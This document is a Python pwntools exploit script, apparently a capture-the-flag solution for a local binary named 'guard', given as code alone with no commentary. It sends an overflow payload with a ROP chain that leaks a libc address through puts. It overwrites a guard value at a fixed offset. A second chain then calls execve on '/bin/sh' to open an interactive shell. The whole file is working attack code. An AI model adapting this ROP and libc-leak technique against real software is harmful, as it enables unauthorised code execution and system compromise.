from pwn import *

elf = ELF("./guard", checksec=False)
libc = elf.libc



p = process(elf.path)

p.recvuntil(b"chall.\n")
p.sendline(b"1")


p.sendlineafter(b": ", b"2400")



pop_rdi = 0x0000000000401256

payload = p64(0x0)*5
payload += p64(0x0)
payload += p64(0x0)*1
payload += p64(pop_rdi)
payload += p64(elf.got.puts)
payload += p64(elf.plt.puts)
payload += p64(elf.sym["game"])



payload = payload.ljust(2096, b"\x00")
payload += p64(0x3fd000+0x111)
payload = payload.ljust(2128, b"\x00")


print(len(payload))

p.sendline(payload)

leak = p.recvline().strip()

libc.address = u64(leak.ljust(8, b"\0")) - libc.sym.puts

info("libc @0x%hx" % libc.address)


p.sendline(b"")


syscall = 0x0000000000029db4 + libc.address
pop_rax = 0x0000000000045eb0 + libc.address
pop_rsi = 0x000000000002be51 + libc.address
pop_rdx_rbx = 0x00000000000904a9 + libc.address

payload = b"A"*40
payload += p64(0x0)
payload += p64(0xcafec0decaf3b4b3)



payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh\0")))
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx_rbx)
payload += p64(0)*2
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(syscall)



payload = payload.ljust(2096, b"\x00")
payload += p64(0x3fd000+0x111)
payload = payload.ljust(2128, b"\x00")



p.sendline(payload)

p.interactive()
